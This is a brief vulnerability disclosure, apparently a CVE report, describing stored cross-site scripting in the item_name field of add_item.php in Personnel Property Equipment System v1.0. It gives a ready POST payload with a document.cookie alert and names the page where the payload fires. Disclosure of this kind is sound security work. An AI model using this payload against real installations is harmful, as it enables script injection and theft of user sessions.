# Personnel Property Equipment System v1.0 has stored cross-site scripting

BUG_Author: LeoZhangCA

vendors: https://www.sourcecodester.com/php/11255/personel-property-equipment-system.html

Vulnerability File: /PPES/admin/add_item.php

POST parameter "item_name" exists stored cross-site scripting vulnerability

Payload: ```item_name=<script>alert(document.cookie)</script>&item_brand=2&item_serial=3&item_status=New&item_description=<p>4</p>&save=```

![image](https://github.com/LeozhangCA/CVEReport/blob/main/picture/storeXSS1.png)

Payload will trigger when a user visits on http://localhost/PPES/admin/item.php

![image](https://github.com/LeozhangCA/CVEReport/blob/main/picture/storeXSS2.png)
